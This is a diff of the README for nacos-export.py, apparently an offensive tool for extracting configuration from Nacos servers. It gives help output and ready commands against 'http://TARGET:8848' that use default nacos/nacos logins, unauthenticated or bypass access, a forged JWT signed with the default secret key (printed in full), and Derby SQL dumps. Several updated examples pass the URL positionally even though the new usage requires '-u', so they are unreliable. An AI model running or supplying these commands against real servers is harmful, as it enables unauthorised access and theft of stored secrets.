@@ -8,6 +8,7 @@
 - ✅ 通过unauth/bypass导出配置
 - ✅ 导出配置数量统计
 - ✅ 通过sql导出配置
+- ✅ 判断是否使用derby数据库
 
 ## Use
 
@@ -16,44 +17,45 @@
 > 若要将结果保存至文件，请通过重定向输出方式
 
 ```text
-$ python3.11 nacos-export.py -h
-usage: nacos-export.py [-h] [-u USERNAME] [-p PASSWORD] [-t TOKEN] [-sk SECRETKEY] [--proxy PROXY] url method
+$ python3 nacos-export.py -h
+usage: nacos-export.py [-h] -u URL [-U USERNAME] [-P PASSWORD] [-T TOKEN] [-S SECRETKEY] [--proxy PROXY] [--check-derby]
+                       [--apidump] [--sqldump] [--no-color]
 
  ______________
 < Nacos Export >         @Author: Arm!tage
- --------------          @Version: v1.4.1
+ --------------          @Version: v1.5.0
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\
-                ||----w |       
+                ||----w |         
                 ||     ||
-
-positional arguments:
-  url                   NACOS url, before '/v1'
-  method                Choice method, {login, bypass|unauth, sql, token, secretkey}
 
 options:
   -h, --help            show this help message and exit
-  -u USERNAME, --username USERNAME
-                        NACOS username
-  -p PASSWORD, --password PASSWORD
-                        NACOS password
-  -t TOKEN, --token TOKEN
-                        token
-  -sk SECRETKEY, --secretkey SECRETKEY
-                        secretkey
-  --proxy PROXY         proxy like: http://127.0.0.1:8080
+  -u URL, --url URL     NACOS url, before '/v1'
+  -U USERNAME, --username USERNAME
+                        NACOS username, default: nacos
+  -P PASSWORD, --password PASSWORD
+                        NACOS password, default: nacos
+  -T TOKEN, --token TOKEN
+                        token, default: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-
+                        isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
+  -S SECRETKEY, --secretkey SECRETKEY
+                        secretkey, default: SecretKey012345678901234567890123456789012345678901234567890123456789
+  --proxy PROXY         set proxy, example: http://127.0.0.1:8080
+  --check-derby         Check standalone mode
+  --apidump             extract NACOS config
+  --sqldump             extract NACOS config from Derby database
+  --no-color            Print without Color
 ```
 
 ## Nuclei Template
 
 - **nacos-default-login**
-  - `python3 nacos-export.py http://TARGET:8848/nacos login -u nacos -p nacos`
+  - `python3 nacos-export.py -u http://TARGET:8848/nacos -U nacos -P nacos --apidump`
 - **unauthenticated-nacos-access**
-  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
-  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
+  - `python3 nacos-export.py http://TARGET:8848/nacos --apidump`
 - **nacos-auth-bypass**
-  - `python3 nacos-export.py http://TARGET:8848/nacos unauth`
-  - `python3 nacos-export.py http://TARGET:8848/nacos bypass`
+  - `python3 nacos-export.py http://TARGET:8848/nacos --apidump`
 - **nacos-authentication-bypass:extracted-credentials**
-  - `python3 nacos-export.py http://TARGET:8848/nacos token -t eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`
+  - `python3 nacos-export.py http://TARGET:8848/nacos -T eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g --apidump`
